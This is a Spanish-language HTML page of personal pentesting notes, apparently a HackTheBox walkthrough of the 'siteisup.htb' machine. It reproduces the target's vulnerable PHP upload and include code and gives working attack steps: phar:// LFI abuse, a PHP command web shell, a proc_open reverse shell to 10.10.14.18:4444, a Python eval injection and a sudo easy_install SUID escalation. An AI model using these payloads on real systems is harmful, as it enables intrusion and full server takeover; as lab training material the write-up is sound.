@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git-dumper http://siteisup.htb/dev/.git/ ./repo&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git-dumper http://siteisup.htb/dev/.git/ ./repo
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://siteisup.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.siteisup.htb"</span> <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">.htaccess</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
+</code></pre></div></div>
+
+<hr />
+
+<p>✅ <strong>1️⃣ <code class="language-plaintext highlighter-rouge">SetEnvIfNoCase Special-Dev "only4dev" Required-Header</code></strong></p>
+
+<ul>
+  <li>
+    <p>Esta directiva crea una <strong>variable de entorno</strong> llamada <code class="language-plaintext highlighter-rouge">Required-Header</code> <strong>si la cabecera HTTP <code class="language-plaintext highlighter-rouge">Special-Dev</code> existe (ignorando mayúsculas/minúsculas) y su valor es <code class="language-plaintext highlighter-rouge">"only4dev"</code></strong>.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">SetEnvIfNoCase</code> funciona igual que <code class="language-plaintext highlighter-rouge">SetEnvIf</code> pero sin diferenciar mayúsculas de minúsculas.</p>
+  </li>
+  <li>
+    <p>Ejemplo: si la petición tiene <code class="language-plaintext highlighter-rouge">Special-Dev: only4dev</code> → se define <code class="language-plaintext highlighter-rouge">Required-Header</code>.</p>
+  </li>
+</ul>
+
+<hr />
+
+<p>✅ <strong>2️⃣ <code class="language-plaintext highlighter-rouge">Order Deny,Allow</code></strong></p>
+
+<ul>
+  <li>
+    <p>Define el <strong>orden de aplicación de reglas</strong> de acceso:</p>
+
+    <ul>
+      <li>
+        <p>Primero se aplican todas las reglas <code class="language-plaintext highlighter-rouge">Deny</code>.</p>
+      </li>
+      <li>
+        <p>Luego se aplican todas las reglas <code class="language-plaintext highlighter-rouge">Allow</code>.</p>
+      </li>
+      <li>
+        <p>Si hay conflicto, <code class="language-plaintext highlighter-rouge">Allow</code> sobrescribe <code class="language-plaintext highlighter-rouge">Deny</code>.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<p>✅ <strong>3️⃣ <code class="language-plaintext highlighter-rouge">Deny from All</code></strong></p>
+
+<ul>
+  <li><strong>Deniega todo el acceso por defecto</strong>.</li>
+</ul>
+
+<hr />
+
+<p>✅ <strong>4️⃣ <code class="language-plaintext highlighter-rouge">Allow from env=Required-Header</code></strong></p>
+
+<ul>
+  <li>
+    <p><strong>Permite el acceso solo si la variable de entorno <code class="language-plaintext highlighter-rouge">Required-Header</code> está definida</strong>.</p>
+  </li>
+  <li>
+    <p>Es decir, <strong>solo pasa quien envíe la cabecera <code class="language-plaintext highlighter-rouge">Special-Dev</code> con valor <code class="language-plaintext highlighter-rouge">only4dev</code></strong>.</p>
+  </li>
+</ul>
+
+<hr />
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="no">DIRECTACCESS</span><span class="p">){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Access Denied"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">'utf-8'</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"chrome=1"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">media=</span><span class="s">"screen"</span> <span class="na">href=</span><span class="s">"stylesheet.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Is my Website up ? (beta version)<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+
+  <span class="nt">&lt;body&gt;</span>
+
+    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"header_wrap"</span> <span class="na">class=</span><span class="s">"outer"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"project_title"</span><span class="nt">&gt;</span>Welcome,<span class="nt">&lt;br&gt;</span> Is My Website UP ?<span class="nt">&lt;/h1&gt;</span>
+          <span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"project_tagline"</span><span class="nt">&gt;</span>In this version you are able to scan a list of websites !<span class="nt">&lt;/h2&gt;</span>
+        <span class="nt">&lt;/header&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"main_content_wrap"</span> <span class="na">class=</span><span class="s">"outer"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"main_content"</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;label&gt;</span>List of websites to check:<span class="nt">&lt;/label&gt;&lt;br&gt;&lt;br&gt;</span>
+                                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span> <span class="na">size=</span><span class="s">"50"</span><span class="nt">&gt;</span>
+                                <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"check"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Check"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;/form&gt;</span>
+
+<span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="n">isitup</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+        <span class="nv">$ch</span><span class="o">=</span><span class="nb">curl_init</span><span class="p">();</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_USERAGENT</span><span class="p">,</span> <span class="s2">"siteisup.htb beta"</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+        <span class="nv">$header</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="k">AND</span> <span class="nv">$header</span><span class="p">[</span><span class="s1">'http_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
+                <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'check'</span><span class="p">]){</span>
+  
+        <span class="c1"># File size must be less than 10kb.</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"File too large!"</span><span class="p">);</span>
+    <span class="p">}</span>
+        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
+        
+        <span class="c1"># Check if extension is allowed.</span>
+        <span class="nv">$ext</span> <span class="o">=</span> <span class="nf">getExtension</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i"</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)){</span> <span class="c1">#No checkea phar</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">"Extension not allowed!"</span><span class="p">);</span>
+        <span class="p">}</span>
+  
+        <span class="c1"># Create directory to upload our file.</span>
+        <span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"uploads/"</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">())</span><span class="mf">.</span><span class="s2">"/"</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
+        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0770</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+  
+  <span class="c1"># Upload the file.</span>
+        <span class="nv">$final_path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="mf">.</span><span class="nv">$file</span><span class="p">;</span>
+        <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$final_path</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+        
+  <span class="c1"># Read the uploaded file.</span>
+        <span class="nv">$websites</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">));</span>
+        
+        <span class="k">foreach</span><span class="p">(</span><span class="nv">$websites</span> <span class="k">as</span> <span class="nv">$site</span><span class="p">){</span>
+                <span class="nv">$site</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#file://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#data://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#ftp://#i"</span><span class="p">,</span><span class="nv">$site</span><span class="p">)){</span>
+                        <span class="nv">$check</span><span class="o">=</span><span class="nf">isitup</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
+                        <span class="k">if</span><span class="p">(</span><span class="nv">$check</span><span class="p">){</span>
+                                <span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
+                        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                                <span class="k">echo</span> <span class="s2">"&lt;center&gt;</span><span class="si">{</span><span class="nv">$site</span><span class="si">}</span><span class="s2">&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
+                        <span class="p">}</span>       
+                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                        <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;"</span><span class="p">;</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+        
+  <span class="c1"># Delete the uploaded file.</span>
+        <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$final_path</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">getExtension</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">strrpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"."</span><span class="p">);</span> <span class="c1">#Devuelve la posición del .</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nv">$extension</span><span class="o">===</span><span class="kc">false</span><span class="p">)</span> <span class="o">?</span> <span class="s2">""</span> <span class="o">:</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$extension</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">#shell.php%00.txt</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+      <span class="nt">&lt;/section&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"footer_wrap"</span> <span class="na">class=</span><span class="s">"outer"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"copyright"</span><span class="nt">&gt;</span>siteisup.htb (beta)<span class="nt">&lt;/p&gt;&lt;br&gt;</span>
+        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"changelog"</span> <span class="na">href=</span><span class="s">"changelog.txt"</span><span class="nt">&gt;</span>changelog.txt<span class="nt">&lt;/a&gt;&lt;br&gt;</span>
+      <span class="nt">&lt;/footer&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;b&gt;</span>This is only for developers<span class="nt">&lt;/b&gt;</span>
+<span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?page=admin"</span><span class="nt">&gt;</span>Admin Panel<span class="nt">&lt;/a&gt;</span>
+<span class="cp">&lt;?php</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s2">"DIRECTACCESS"</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+        <span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/bin|usr|home|var|etc/i"</span><span class="p">,</span><span class="nv">$page</span><span class="p">)){</span>
+                <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">include</span><span class="p">(</span><span class="s2">"checker.php"</span><span class="p">);</span>
+        <span class="p">}</span>       
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<hr />
+
+<p><strong>¿Qué es un <code class="language-plaintext highlighter-rouge">.phar</code>?</strong><br />
+Un archivo <code class="language-plaintext highlighter-rouge">.phar</code> (<strong>PHP Archive</strong>) es básicamente un archivo comprimido (como un <code class="language-plaintext highlighter-rouge">.zip</code> o <code class="language-plaintext highlighter-rouge">.tar</code>) que <strong>empaqueta scripts PHP, librerías y recursos</strong> en un solo archivo. Es como un <code class="language-plaintext highlighter-rouge">.jar</code> de Java, pero para PHP.</p>
+
+<hr />
+
+<p><strong>¿Qué pasa si pones un <code class="language-plaintext highlighter-rouge">.phar</code> en un servidor Apache?</strong></p>
+
+<p>Depende <strong>totalmente</strong> de <strong>cómo se accede al archivo y cómo está configurado Apache/PHP</strong>:</p>
+
+<p>✅ <strong>1. Si accedes directamente al <code class="language-plaintext highlighter-rouge">.phar</code> en la URL:</strong><br />
+Por ejemplo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://tuweb.com/archivo.phar
+</code></pre></div></div>
+
+<p>Normalmente <strong>Apache lo trata como un archivo estático</strong>. No lo ejecuta. Simplemente <strong>descargará el archivo</strong> o devolverá su contenido como texto binario.<br />
+<strong>No se ejecuta el PHP dentro.</strong></p>
+
+<hr />
+
+<p>✅ <strong>2. Si incluyes el <code class="language-plaintext highlighter-rouge">.phar</code> desde otro script PHP:</strong><br />
+Ejemplo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s1">'archivo.phar'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Entonces <strong>sí se ejecuta</strong>. Es como si hicieras <code class="language-plaintext highlighter-rouge">include</code> de un <code class="language-plaintext highlighter-rouge">.php</code>.<br />
+Esto es lo normal: usar <code class="language-plaintext highlighter-rouge">.phar</code> como librerías empaquetadas.</p>
+
+<hr />
+
+<p>🚫 <strong>3. Si usas <code class="language-plaintext highlighter-rouge">.phar</code> con flujos <code class="language-plaintext highlighter-rouge">phar://</code> o funciones especiales:</strong><br />
+PHP permite leer contenido dentro del archivo usando <code class="language-plaintext highlighter-rouge">phar://</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$file</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'phar://archivo.phar/index.php'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>O incluso:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="s1">'phar://archivo.phar/index.php'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>En este caso <strong>también se ejecuta</strong>, porque lo estás incluyendo explícitamente.</p>
+
+<hr />
+
+<h1 id="lfi"><strong>LFI</strong>:</h1>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Si subes algo que no legible (como un zip) peta el script y el archivo no se elimina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip info.m0b shell.php
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dev.siteisup.htb/?page<span class="o">=</span>phar://uploads/828afc50efeaa61d10099d92a4f618c5/info.m0b/shell <span class="c">#Y aquí el código metería .php</span>
+</code></pre></div></div>
+
+<p>No podemos subir una shell como:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;&lt;body&gt;&lt;pre&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="p">}</span><span class="cp">?&gt;</span><span class="nt">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Porque si subimos un phpinfo() nos tira varias <code class="language-plaintext highlighter-rouge">disable_functions</code>, entre ellas system.
+Para saber si alguna nos permite ejecutar rce
+Ejecutamos https://github.com/teambi0s/dfunc-bypasser.git sobre el archivo info.php</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 dfunc-bypasser.py <span class="nt">--url</span> http://dev.siteisup.htb/?page<span class="o">=</span>phar://uploads/5e31601b65f0062e32966f2f8e94fbb0/info.0xdf/info
+</code></pre></div></div>
+
+<p>Revershe shell usando proc_open:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+        <span class="nv">$descspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>
+                <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>
+                <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>
+        <span class="p">);</span>
+        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">"/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.18/4444 0&gt;&amp;1'"</span><span class="p">;</span>
+        <span class="nv">$proc</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$descspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<h1 id="lfi2rce">LFI2RCE</h1>
+
+<p>https://github.com/synacktiv/php_filter_chain_generator</p>
+
+<pre><code class="language-BASH">python php_filter_chain_generator.py --chain '&lt;?php echo "M0B was here"; ?&gt;'
+</code></pre>
+
+<hr />
+<h1 id="www-data-a-developer">www-data a developer</h1>
+
+<p>Aquí hay RCE porque input evalua todo lo que le pasas:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter URL here:</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">page</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">page</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+	<span class="k">print</span> <span class="sh">"</span><span class="s">Website is up</span><span class="sh">"</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="k">print</span> <span class="sh">"</span><span class="s">Website is down</span><span class="sh">"</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="developer-a-root">developer a root</h1>
+
+<p>Tiramos de gfto BINS</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(ALL) NOPASSWD: /usr/local/bin/easy_install
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">setup.py</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">chmod u+s /bin/bash</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>easy_install /tmp/ 
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
